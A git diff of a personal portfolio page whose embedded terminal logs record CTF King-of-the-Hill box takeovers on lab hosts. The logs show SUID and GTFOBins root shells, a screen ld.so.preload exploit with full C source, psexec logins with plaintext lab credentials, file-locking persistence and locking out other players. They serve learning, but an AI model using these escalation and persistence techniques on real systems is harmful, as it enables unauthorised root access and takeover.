@@ -1661,7 +1661,9 @@
               xmlns="http://www.w3.org/2000/svg"
             ></svg>
           </div>
-          <div class="ap-hint">click any node to expand it</div>
+          <div class="ap-hint">
+            click any node to expand it, or use ← → keys
+          </div>
           <div class="ap-scrim" id="ap-scrim"></div>
           <div
             class="ap-pop"
@@ -1680,7 +1682,7 @@
 
     <script>
       /* ════════ EDIT YOUR CONTENT HERE ════════
-                           Each item: { title, desc, tags: [], href }  (href optional)               */
+                                 Each item: { title, desc, tags: [], href }  (href optional)               */
 
       const PROJECTS = [
         {
@@ -1703,44 +1705,44 @@
           desc: "SUID find binary (find -exec sh) for instant root; pulled 4 flags across users plus a base64 flag hidden in a SQLite web.db.",
           tags: ["Linux", "SUID", "KoTH"],
           log: String.raw`┌──(root㉿kali)-[/home/kali]
-            └─# ssh bobba@10.10.60.230
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            bobba@10.10.60.230's password:
+                  └─# ssh bobba@10.10.60.230
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  bobba@10.10.60.230's password:
 
-            The programs included with the Debian GNU/Linux system are free software;
-            the exact distribution terms for each program are described in the
-            individual files in /usr/share/doc/*/copyright.
+                  The programs included with the Debian GNU/Linux system are free software;
+                  the exact distribution terms for each program are described in the
+                  individual files in /usr/share/doc/*/copyright.
 
-            Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-            permitted by applicable law.
-            $ whoami
-            bobba
-            $ /usr/bin/find . -exec /bin/sh \; -quit
-            # whoami
-            root
-            # id
-            uid=1000(bobba) gid=1000(bobba) euid=0(root) groups=1000(bobba)
-            # cat /home/bobba/flag1.txt
-            [REDACTED]
-            # cat /home/yoda/flag2.txt
-            [REDACTED]
-            # cat /home/duku/flag3.txt
-            [REDACTED]
-            # cat /root/flag4.txt
-            [REDACTED]
-            # /var/www/html/web1/web.db
-            /bin/sh: 7: /var/www/html/web1/web.db: Permission denied
-            # cat /var/www/html/web1/web.db
-            CtableusersusersCREATE TABLE users ( username TEXT NOT NULL PRIMARY KEY, password TEXT NOT NULL, flag TEXT))=indexsqlite_autoi\ufffd\ufffdM-ubobba-\`G)8(t/NDkZ"u^{[REDACTED]
-            \ufffd\ufffd      bobba# cat /var/www/html/web2/flag.txt
-            [REDACTED]
-            # cat /var/www/html/web3/flag.txt
-            [REDACTED]
-            #
-            1st flag is decoded by ROT13 while the second flag is decoded using hex
-            for the web.db flag it's a base64 encoded string`,
+                  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+                  permitted by applicable law.
+                  $ whoami
+                  bobba
+                  $ /usr/bin/find . -exec /bin/sh \; -quit
+                  # whoami
+                  root
+                  # id
+                  uid=1000(bobba) gid=1000(bobba) euid=0(root) groups=1000(bobba)
+                  # cat /home/bobba/flag1.txt
+                  [REDACTED]
+                  # cat /home/yoda/flag2.txt
+                  [REDACTED]
+                  # cat /home/duku/flag3.txt
+                  [REDACTED]
+                  # cat /root/flag4.txt
+                  [REDACTED]
+                  # /var/www/html/web1/web.db
+                  /bin/sh: 7: /var/www/html/web1/web.db: Permission denied
+                  # cat /var/www/html/web1/web.db
+                  CtableusersusersCREATE TABLE users ( username TEXT NOT NULL PRIMARY KEY, password TEXT NOT NULL, flag TEXT))=indexsqlite_autoi\ufffd\ufffdM-ubobba-\`G)8(t/NDkZ"u^{[REDACTED]
+                  \ufffd\ufffd      bobba# cat /var/www/html/web2/flag.txt
+                  [REDACTED]
+                  # cat /var/www/html/web3/flag.txt
+                  [REDACTED]
+                  #
+                  1st flag is decoded by ROT13 while the second flag is decoded using hex
+                  for the web.db flag it's a base64 encoded string`,
         },
         {
           title: "Food",
@@ -1748,217 +1750,217 @@
           tags: ["Linux", "LD_PRELOAD", "KoTH"],
           log: String.raw`Credentials: ramen@<Target_IP> Password: [REDACTED]
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# ssh ramen@10.10.125.28
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            ramen@10.10.125.28's password:
-            Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh ramen@10.10.125.28
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  ramen@10.10.125.28's password:
+                  Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
-             * Documentation:  https://help.ubuntu.com
-             * Management:     https://landscape.canonical.com
-             * Support:        https://ubuntu.com/advantage
+                   * Documentation:  https://help.ubuntu.com
+                   * Management:     https://landscape.canonical.com
+                   * Support:        https://ubuntu.com/advantage
 
-              System information as of Tue Sep  8 16:20:01 UTC 2026
+                    System information as of Tue Sep  8 16:20:01 UTC 2026
 
-              System load:  0.0               Processes:           103
-              Usage of /:   43.7% of 9.78GB   Users logged in:     1
-              Memory usage: 51%               IP address for ens5: 10.10.125.28
-              Swap usage:   0%
+                    System load:  0.0               Processes:           103
+                    Usage of /:   43.7% of 9.78GB   Users logged in:     1
+                    Memory usage: 51%               IP address for ens5: 10.10.125.28
+                    Swap usage:   0%
 
-            0 packages can be updated.
-            0 updates are security updates.
+                  0 packages can be updated.
+                  0 updates are security updates.
 
-            Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+                  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
-            Last login: Tue Sep  8 16:18:38 2026 from 192.168.128.10
-            ramen@foodctf:~$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
-            ramen@foodctf:~$ id
-            uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)
-            ramen@foodctf:~$ cat >/tmp/libhax.c <<'EOF'
-            > #include <stdio.h>
-            > #include <sys/types.h>
-            > #include <unistd.h>
-            > __attribute__((constructor))
-            > void dropshell(void){chown("/tmp/rootshell",0,0);chmod("/tmp/rootshell",04755);unlink("/etc/ld.so.preload");}
-            > EOF
-            ramen@foodctf:~$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
-            /tmp/libhax.c: In function 'dropshell':
-            /tmp/libhax.c:5:50: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
-             void dropshell(void){chown("/tmp/rootshell",0,0);chmod("/tmp/rootshell",04755);unlink("/etc/ld.so.preload");}
-                                                              ^~~~~
-                                                              chroot
-            ramen@foodctf:~$ cat >/tmp/rootshell.c <<'EOF'
-            > #include <unistd.h>
-            > int main(){setuid(0);setgid(0);execl("/bin/sh","sh",NULL);}
-            > EOF
-            ramen@foodctf:~$ gcc -o /tmp/rootshell /tmp/rootshell.c
-            ramen@foodctf:~$ cd /etc
-            ramen@foodctf:/etc$ umask 000
-            ramen@foodctf:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
-            ramen@foodctf:/etc$ screen -ls
-            ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
-            There is a screen on:
-                    1588.x  (Detached)
-            1 Socket in /tmp/screens/S-ramen.
-            ramen@foodctf:/etc$ /tmp/rootshell
-            # id
-            sh: 1: idid: not found
-            # id
-            uid=0(root) gid=0(root) groups=0(root),1003(ramen)
-            # nano KoTH.c
-            # gcc KoTH.c -o KoTH
-            # ./KoTH
-            ^C
-            # echo 0x7f3a > /root/king.txt
-            # chmod 400 /root/king.txt
-            # cat /root/king.txt
-            0x7f3a
-            # ./KoTH
-            ^C
-            # cat king.txt
-            cat: king.txt: No such file or directory
-            # cat /root/king.txt
-            0x7f3a
-            # nano /root/king.txt
-            # exit
-            ramen@foodctf:/etc$ /tmp/rootshell
-            # id
-            uid=0(root) gid=0(root) groups=0(root),1003(ramen)
-            # nano KoTH.c
-            # ./KoTH.c
-            sh: 3: ./KoTH.c: Permission denied
-            # ./KoTH
-            ^C
-            # chmod 600 /root/king.txt
-            # ./KoTH
-            ^C
-            # ls -l /root/king.txt
-            -rw------- 1 root root 6 Sep  8 16:29 /root/king.txt
-            # cat KoTH.c
-            #include <stdio.h>
-            #include <unistd.h>
+                  Last login: Tue Sep  8 16:18:38 2026 from 192.168.128.10
+                  ramen@foodctf:~$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+                  ramen@foodctf:~$ id
+                  uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)
+                  ramen@foodctf:~$ cat >/tmp/libhax.c <<'EOF'
+                  > #include <stdio.h>
+                  > #include <sys/types.h>
+                  > #include <unistd.h>
+                  > __attribute__((constructor))
+                  > void dropshell(void){chown("/tmp/rootshell",0,0);chmod("/tmp/rootshell",04755);unlink("/etc/ld.so.preload");}
+                  > EOF
+                  ramen@foodctf:~$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+                  /tmp/libhax.c: In function 'dropshell':
+                  /tmp/libhax.c:5:50: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
+                   void dropshell(void){chown("/tmp/rootshell",0,0);chmod("/tmp/rootshell",04755);unlink("/etc/ld.so.preload");}
+                                                                    ^~~~~
+                                                                    chroot
+                  ramen@foodctf:~$ cat >/tmp/rootshell.c <<'EOF'
+                  > #include <unistd.h>
+                  > int main(){setuid(0);setgid(0);execl("/bin/sh","sh",NULL);}
+                  > EOF
+                  ramen@foodctf:~$ gcc -o /tmp/rootshell /tmp/rootshell.c
+                  ramen@foodctf:~$ cd /etc
+                  ramen@foodctf:/etc$ umask 000
+                  ramen@foodctf:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+                  ramen@foodctf:/etc$ screen -ls
+                  ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+                  There is a screen on:
+                          1588.x  (Detached)
+                  1 Socket in /tmp/screens/S-ramen.
+                  ramen@foodctf:/etc$ /tmp/rootshell
+                  # id
+                  sh: 1: idid: not found
+                  # id
+                  uid=0(root) gid=0(root) groups=0(root),1003(ramen)
+                  # nano KoTH.c
+                  # gcc KoTH.c -o KoTH
+                  # ./KoTH
+                  ^C
+                  # echo 0x7f3a > /root/king.txt
+                  # chmod 400 /root/king.txt
+                  # cat /root/king.txt
+                  0x7f3a
+                  # ./KoTH
+                  ^C
+                  # cat king.txt
+                  cat: king.txt: No such file or directory
+                  # cat /root/king.txt
+                  0x7f3a
+                  # nano /root/king.txt
+                  # exit
+                  ramen@foodctf:/etc$ /tmp/rootshell
+                  # id
+                  uid=0(root) gid=0(root) groups=0(root),1003(ramen)
+                  # nano KoTH.c
+                  # ./KoTH.c
+                  sh: 3: ./KoTH.c: Permission denied
+                  # ./KoTH
+                  ^C
+                  # chmod 600 /root/king.txt
+                  # ./KoTH
+                  ^C
+                  # ls -l /root/king.txt
+                  -rw------- 1 root root 6 Sep  8 16:29 /root/king.txt
+                  # cat KoTH.c
+                  #include <stdio.h>
+                  #include <unistd.h>
 
-            int main(void) {
-                const char *username = "0x7f3a";
-                const char *file = "/root/king.txt";
+                  int main(void) {
+                      const char *username = "0x7f3a";
+                      const char *file = "/root/king.txt";
 
-                while (1) {
-                    FILE *f = fopen(file, "w");
+                      while (1) {
+                          FILE *f = fopen(file, "w");
 
-                    if (f != NULL) {
-                        fprintf(f, "%s\n", username);
-                        fclose(f);
-                    }
+                          if (f != NULL) {
+                              fprintf(f, "%s\n", username);
+                              fclose(f);
+                          }
 
-                    usleep(100000); // 0.1 seconds
-                }
+                          usleep(100000); // 0.1 seconds
+                      }
 
-                return 0;
-            }
-            // How to Run:
-            // Compile: gcc KoTH.c -o KoTH
-            // Run: sudo ./KoTH
+                      return 0;
+                  }
+                  // How to Run:
+                  // Compile: gcc KoTH.c -o KoTH
+                  // Run: sudo ./KoTH
 
-            # ./KoTH &
-            # ps aux | grep '[K]oTH'
-            root      2083  0.1  0.0   4508   740 pts/0    S    16:31   0:00 ./KoTH
-            # cat /root/king.txt
-            0x7f3a`,
+                  # ./KoTH &
+                  # ps aux | grep '[K]oTH'
+                  root      2083  0.1  0.0   4508   740 pts/0    S    16:31   0:00 ./KoTH
+                  # cat /root/king.txt
+                  0x7f3a`,
         },
         {
           title: "Fortune",
           desc: "Chained GTFOBins (ionice/nice/xargs) to pop a root shell off a misconfigured SUID binary; cracked a bonus zip with fcrackzip.",
           tags: ["Linux", "GTFOBins", "KoTH"],
           log: String.raw`┌──(root㉿kali)-[/home/kali]
-            └─# cat creds.txt
-            fortuna:[REDACTED]
+                  └─# cat creds.txt
+                  fortuna:[REDACTED]
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# ssh fortuna@10.10.37.153
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            fortuna@10.10.37.153's password:
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh fortuna@10.10.37.153
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  fortuna@10.10.37.153's password:
 
-                    ################################
-                    ###  Come to try your luck?  ###
-                    ### Welcome to your fortune! ###
-                    ################################
+                          ################################
+                          ###  Come to try your luck?  ###
+                          ### Welcome to your fortune! ###
+                          ################################
 
-            fortuna@fortune:~$ ionice /bin/sh -p
-            $ /usr/bin/nice /bin/sh -p
-            # xargs -a /dev/null sh -p
-            # python -c 'import pty; pty.spawn("/home/lucky_shell")'
-            Rolling the dice!
-            Unlucky!
-            # id
-            uid=1000(fortuna) gid=1000(fortuna) euid=0(root) groups=1000(fortuna),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
-            # whoami
-            root
-            # cat /media/darts
-            [REDACTED]
-            # cat /srv/blackjack
-            [REDACTED]
-            # /lib/checkers
-            sh: 6: /lib/checkers: Permission denied
-            # cat /lib/checkers
-            [REDACTED]
-            # cat /usr/games/flag
-            [REDACTED]
-            # cat /usr/local/games/flag
-            [REDACTED]
-            # cat /geama/flag
-            [REDACTED]
-            # cat /home/fortuna/Desktop/chess
-            [REDACTED]
-            #
-            How to get the creds
-            nc <target_ip> 3333 -w 10 | base64 -d > fortuna.zip
-            fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt fortuna.zip`,
+                  fortuna@fortune:~$ ionice /bin/sh -p
+                  $ /usr/bin/nice /bin/sh -p
+                  # xargs -a /dev/null sh -p
+                  # python -c 'import pty; pty.spawn("/home/lucky_shell")'
+                  Rolling the dice!
+                  Unlucky!
+                  # id
+                  uid=1000(fortuna) gid=1000(fortuna) euid=0(root) groups=1000(fortuna),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
+                  # whoami
+                  root
+                  # cat /media/darts
+                  [REDACTED]
+                  # cat /srv/blackjack
+                  [REDACTED]
+                  # /lib/checkers
+                  sh: 6: /lib/checkers: Permission denied
+                  # cat /lib/checkers
+                  [REDACTED]
+                  # cat /usr/games/flag
+                  [REDACTED]
+                  # cat /usr/local/games/flag
+                  [REDACTED]
+                  # cat /geama/flag
+                  [REDACTED]
+                  # cat /home/fortuna/Desktop/chess
+                  [REDACTED]
+                  #
+                  How to get the creds
+                  nc <target_ip> 3333 -w 10 | base64 -d > fortuna.zip
+                  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt fortuna.zip`,
         },
         {
           title: "H1-Medium",
           desc: "Windows box taken with impacket-psexec off leaked creds, dumping Desktop flags from five separate user profiles.",
           tags: ["Windows", "Impacket"],
           log: String.raw`┌──(root㉿kali)-[/home/kali]
-            └─# impacket-psexec TROY.thm/achilles:winniethepooh@10.10.239.66
-            Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+                  └─# impacket-psexec TROY.thm/achilles:winniethepooh@10.10.239.66
+                  Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
-            [*] Requesting shares on 10.10.239.66.....
-            [*] Found writable share ADMIN$
-            [*] Uploading file qzHOWyhP.exe
-            [*] Opening SVCManager on 10.10.239.66.....
-            [*] Creating service mrXI on 10.10.239.66.....
-            [*] Starting service mrXI.....
-            [!] Press help for extra shell commands
-            Microsoft Windows [Version 10.0.17763.1757]
-            (c) 2018 Microsoft Corporation. All rights reserved.
+                  [*] Requesting shares on 10.10.239.66.....
+                  [*] Found writable share ADMIN$
+                  [*] Uploading file qzHOWyhP.exe
+                  [*] Opening SVCManager on 10.10.239.66.....
+                  [*] Creating service mrXI on 10.10.239.66.....
+                  [*] Starting service mrXI.....
+                  [!] Press help for extra shell commands
+                  Microsoft Windows [Version 10.0.17763.1757]
+                  (c) 2018 Microsoft Corporation. All rights reserved.
 
-            C:\Windows\system32> type C:\Users\achilles\Desktop\flag.txt
-            [REDACTED]
-            C:\Windows\system32> type C:\Users\agamemnon\Desktop\flag.txt
-            [REDACTED]
-            C:\Windows\system32> type C:\Users\hector\Desktop\flag.txt
-            [REDACTED]
-            C:\Windows\system32> type C:\Users\helen\Desktop\flag.txt
-            [REDACTED]
-            C:\Windows\system32> type C:\Users\patrocles\Desktop\flag.txt
-            [REDACTED]
-            C:\Windows\system32> echo "0x7f3a" > C:\king.txt
-            Access is denied.
+                  C:\Windows\system32> type C:\Users\achilles\Desktop\flag.txt
+                  [REDACTED]
+                  C:\Windows\system32> type C:\Users\agamemnon\Desktop\flag.txt
+                  [REDACTED]
+                  C:\Windows\system32> type C:\Users\hector\Desktop\flag.txt
+                  [REDACTED]
+                  C:\Windows\system32> type C:\Users\helen\Desktop\flag.txt
+                  [REDACTED]
+                  C:\Windows\system32> type C:\Users\patrocles\Desktop\flag.txt
+                  [REDACTED]
+                  C:\Windows\system32> echo "0x7f3a" > C:\king.txt
+                  Access is denied.
 
-            C:\Windows\system32> type C:\king.txt
-            "0x7f3a"
+                  C:\Windows\system32> type C:\king.txt
+                  "0x7f3a"
 
-            C:\Windows\system32> attrib -R C:\king.txt
+                  C:\Windows\system32> attrib -R C:\king.txt
 
-            C:\Windows\system32> echo 0x7f3a > C:\king.txt
+                  C:\Windows\system32> echo 0x7f3a > C:\king.txt
 
-            C:\Windows\system32> attrib +R C:\king.txt
+                  C:\Windows\system32> attrib +R C:\king.txt
 
-            C:\Windows\system32>`,
+                  C:\Windows\system32>`,
         },
         {
           title: "Offline",
@@ -1966,454 +1968,453 @@
           tags: ["Windows", "AD", "KoTH"],
           log: String.raw`can go straight to system with psexec.py kingofthe.domain/svc_robotarmy:robots@<ip>
 
-            ssh: [REDACTED]
+                  ssh: [REDACTED]
 
-            scara:[REDACTED]
+                  scara:[REDACTED]
 
-            toast:[REDACTED]
+                  toast:[REDACTED]
 
-            mykull:[REDACTED]
+                  mykull:[REDACTED]
 
-            fed:[REDACTED]
+                  fed:[REDACTED]
 
-            king.txt, under Administrator/king-server/, can be made immutable with the attrib +r king.txt command.
-            note the icacls command could also be used to mess with permissions. can use takeown /f .\king.txt as a quick recover if someone else has taken over the file
+                  king.txt, under Administrator/king-server/, can be made immutable with the attrib +r king.txt command.
+                  note the icacls command could also be used to mess with permissions. can use takeown /f .\king.txt as a quick recover if someone else has taken over the file
 
-            when dealing with dicks do the following:
-
-            net user svc_robotarmy sdfsjkfskkjiouuiyeruiysdf
-            [establish a russh shell]
-            taskkill /f /pid powershell.exe
-            taskkill /f /pid cmd.exe
-            Number of flags: 8, (Flags are redacted cause of thm spoiler policy)`,
+                  do the following to change the password
+                  net user svc_robotarmy sdfsjkfskkjiouuiyeruiysdf
+                  [establish a russh shell]
+                  taskkill /f /pid powershell.exe
+                  taskkill /f /pid cmd.exe
+                  Number of flags: 8, (Flags are redacted cause of thm spoiler policy)`,
         },
         {
           title: "Panda",
           desc: "Containerized root shell with layered flags needing both hex and base64 decoding, including one buried in a Samba binary's strings.",
           tags: ["Linux", "Encoding"],
           log: String.raw`bash-4.2# id
-            uid=1001(shifu) gid=1001(shifu) euid=0(root) groups=1001(shifu)
-            bash-4.2# whoami
-            root
-            bash-4.2# cat king.txt
-            0x7f3a
-            bash-4.2# cat /root/.flag
-            [REDACTED]
-            bash-4.2# cat /home/po/flag.txt
-            [REDACTED]
-            bash-4.2# /home/shifu/flag.txt
-            bash: /home/shifu/flag.txt: Permission denied
-            bash-4.2# cat /home/shifu/flag.txt
-            [REDACTED]
-            bash-4.2# cat /home/tigress/flag.txt
-            [REDACTED]
-            bash-4.2# /var/www/html/flag/index.html (hex and b64)
-            bash: syntax error near unexpected token \`hex'
-            bash-4.2# cat /var/www/html/flag/index.html
-            [REDACTED]
-            bash-4.2# cat /var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
-            [REDACTED]
-            bash-4.2# cat /srv/samba/anonymous/binary
-            [garbled binary data]
-            bash-4.2# strings /srv/samba/anonymous/binary
-            /lib64/ld-linux-x86-64.so.2
-            libc.so.6
-            printf
-            __libc_start_main
-            __gmon_start__
-            GLIBC_2.2.5
-            UH-0
-            UH-0
-            =(
-            []A\A]A^A_
-            Hello
-            ;*3$"
-            GCC: (GNU) 4.8.5 20150623 (Red Hat 4.8.5-39)
-            crtstuff.c
-            __JCR_LIST__
-            deregister_tm_clones
-            __do_global_dtors_aux
-            completed.6355
-            __do_global_dtors_aux_fini_array_entry
-            frame_dummy
-            __frame_dummy_init_array_entry
-            binary.c
-            __FRAME_END__
-            __JCR_END__
-            __init_array_end
-            _DYNAMIC
-            __init_array_start
-            __GNU_EH_FRAME_HDR
-            _GLOBAL_OFFSET_TABLE_
-            __libc_csu_fini
-            _edata
-            printf@@GLIBC_2.2.5
-            __libc_start_main@@GLIBC_2.2.5
-            __data_start
-            __gmon_start__
-            __dso_handle
-            _IO_stdin_used
-            __libc_csu_init
-            __bss_start
-            main
-            __TMC_END__
-            .symtab
-            .strtab
-            .shstrtab
-            .interp
-            .note.ABI-tag
-            .note.gnu.build-id
-            .gnu.hash
-            .dynsym
-            .dynstr
-            .gnu.version
-            .gnu.version_r
-            .rela.dyn
-            .rela.plt
-            .init
-            .plt.got
-            .text
-            .fini
-            .rodata
-            .eh_frame_hdr
-            .eh_frame
-            .init_array
-            .fini_array
-            .jcr
-            .dynamic
-            .got.plt
-            .data
-            .bss
-            .comment
-            [REDACTED]
-            6c6CXfJrjej5ATBD
-            bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64
-            [REDACTED]
-            bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64 -d
-            [garbled binary data]
-            bash-4.2# cat /var/www/html/flag/index.html | xxd -p
-            [REDACTED]
-            bash-4.2# # Hex
-            bash-4.2# xxd -p /var/www/html/flag/index.html
-            [REDACTED]
-            bash-4.2#
-            bash-4.2# # Base64
-            bash-4.2# base64 /var/www/html/flag/index.html
-            [REDACTED]
-            bash-4.2# cat /var/www/html/flag/index.html
-            [REDACTED]
-            bash-4.2#
-            last flag: [REDACTED]
-            To get to shifu's shell
-            creds
-            shifu:[Find it yourself]
-            how to be root
-            find . -exec /bin/sh -p \; -quit
-            bash -i -p`,
+                  uid=1001(shifu) gid=1001(shifu) euid=0(root) groups=1001(shifu)
+                  bash-4.2# whoami
+                  root
+                  bash-4.2# cat king.txt
+                  0x7f3a
+                  bash-4.2# cat /root/.flag
+                  [REDACTED]
+                  bash-4.2# cat /home/po/flag.txt
+                  [REDACTED]
+                  bash-4.2# /home/shifu/flag.txt
+                  bash: /home/shifu/flag.txt: Permission denied
+                  bash-4.2# cat /home/shifu/flag.txt
+                  [REDACTED]
+                  bash-4.2# cat /home/tigress/flag.txt
+                  [REDACTED]
+                  bash-4.2# /var/www/html/flag/index.html (hex and b64)
+                  bash: syntax error near unexpected token \`hex'
+                  bash-4.2# cat /var/www/html/flag/index.html
+                  [REDACTED]
+                  bash-4.2# cat /var/www/html/06d63d6798d9b6c2f987f045b12031d6/flag
+                  [REDACTED]
+                  bash-4.2# cat /srv/samba/anonymous/binary
+                  [garbled binary data]
+                  bash-4.2# strings /srv/samba/anonymous/binary
+                  /lib64/ld-linux-x86-64.so.2
+                  libc.so.6
+                  printf
+                  __libc_start_main
+                  __gmon_start__
+                  GLIBC_2.2.5
+                  UH-0
+                  UH-0
+                  =(
+                  []A\A]A^A_
+                  Hello
+                  ;*3$"
+                  GCC: (GNU) 4.8.5 20150623 (Red Hat 4.8.5-39)
+                  crtstuff.c
+                  __JCR_LIST__
+                  deregister_tm_clones
+                  __do_global_dtors_aux
+                  completed.6355
+                  __do_global_dtors_aux_fini_array_entry
+                  frame_dummy
+                  __frame_dummy_init_array_entry
+                  binary.c
+                  __FRAME_END__
+                  __JCR_END__
+                  __init_array_end
+                  _DYNAMIC
+                  __init_array_start
+                  __GNU_EH_FRAME_HDR
+                  _GLOBAL_OFFSET_TABLE_
+                  __libc_csu_fini
+                  _edata
+                  printf@@GLIBC_2.2.5
+                  __libc_start_main@@GLIBC_2.2.5
+                  __data_start
+                  __gmon_start__
+                  __dso_handle
+                  _IO_stdin_used
+                  __libc_csu_init
+                  __bss_start
+                  main
+                  __TMC_END__
+                  .symtab
+                  .strtab
+                  .shstrtab
+                  .interp
+                  .note.ABI-tag
+                  .note.gnu.build-id
+                  .gnu.hash
+                  .dynsym
+                  .dynstr
+                  .gnu.version
+                  .gnu.version_r
+                  .rela.dyn
+                  .rela.plt
+                  .init
+                  .plt.got
+                  .text
+                  .fini
+                  .rodata
+                  .eh_frame_hdr
+                  .eh_frame
+                  .init_array
+                  .fini_array
+                  .jcr
+                  .dynamic
+                  .got.plt
+                  .data
+                  .bss
+                  .comment
+                  [REDACTED]
+                  6c6CXfJrjej5ATBD
+                  bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64
+                  [REDACTED]
+                  bash-4.2# cat /var/www/html/flag/index.html | xxd -p | base64 -d
+                  [garbled binary data]
+                  bash-4.2# cat /var/www/html/flag/index.html | xxd -p
+                  [REDACTED]
+                  bash-4.2# # Hex
+                  bash-4.2# xxd -p /var/www/html/flag/index.html
+                  [REDACTED]
+                  bash-4.2#
+                  bash-4.2# # Base64
+                  bash-4.2# base64 /var/www/html/flag/index.html
+                  [REDACTED]
+                  bash-4.2# cat /var/www/html/flag/index.html
+                  [REDACTED]
+                  bash-4.2#
+                  last flag: [REDACTED]
+                  To get to shifu's shell
+                  creds
+                  shifu:[Find it yourself]
+                  how to be root
+                  find . -exec /bin/sh -p \; -quit
+                  bash -i -p`,
         },
         {
           title: "Production",
           desc: "SMB share leaked an SSH keypair; chained su and a sudo PAGER GTFOBin through git to escalate straight to root.",
           tags: ["Linux", "SMB", "GTFOBins"],
           log: String.raw`┌──(root㉿kali)-[/home/kali]
-            └─# smbclient //10.10.98.241/key
-            Password for [WORKGROUP\root]:
-            Try "help" to get a list of possible commands.
-            smb: \> ls
-              .                                  DR        0  Thu Mar 26 23:24:38 2020
-              ..                                  D        0  Thu Mar 26 20:18:40 2020
-              id_rsa.pub                          A      393  Mon Sep 28 15:02:01 2026
-              flag.txt                            A       33  Thu Mar 26 23:24:38 2020
-              id_rsa                              R     1679  Mon Sep 28 15:02:01 2026
-              authorized_keys                     A      393  Mon Sep 28 15:02:01 2026
+                  └─# smbclient //10.10.98.241/key
+                  Password for [WORKGROUP\root]:
+                  Try "help" to get a list of possible commands.
+                  smb: \> ls
+                    .                                  DR        0  Thu Mar 26 23:24:38 2020
+                    ..                                  D        0  Thu Mar 26 20:18:40 2020
+                    id_rsa.pub                          A      393  Mon Sep 28 15:02:01 2026
+                    flag.txt                            A       33  Thu Mar 26 23:24:38 2020
+                    id_rsa                              R     1679  Mon Sep 28 15:02:01 2026
+                    authorized_keys                     A      393  Mon Sep 28 15:02:01 2026
 
-                            19525500 blocks of size 1024. 13268812 blocks available
-            smb: \> get flag.txt
-            getting file \flag.txt of size 33 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
-            smb: \> get id_rsa
-            getting file \id_rsa of size 1679 as id_rsa (1.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)
-            smb: \> get id_rsa.pub
-            getting file \id_rsa.pub of size 393 as id_rsa.pub (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
-            smb: \> exit
-            ^C
+                                  19525500 blocks of size 1024. 13268812 blocks available
+                  smb: \> get flag.txt
+                  getting file \flag.txt of size 33 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+                  smb: \> get id_rsa
+                  getting file \id_rsa of size 1679 as id_rsa (1.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+                  smb: \> get id_rsa.pub
+                  getting file \id_rsa.pub of size 393 as id_rsa.pub (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+                  smb: \> exit
+                  ^C
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# cat flag.txt
-            [REDACTED]
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# cat flag.txt
+                  [REDACTED]
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# ssh ashu@10.10.98.241 -i id_rsa
-            The authenticity of host '10.10.98.241 (10.10.98.241)' can't be established.
-            ED25519 key fingerprint is: SHA256:ndwZ/MwYvbVyLcm8bvjebocizMD1b8pdb2leReW/6ko
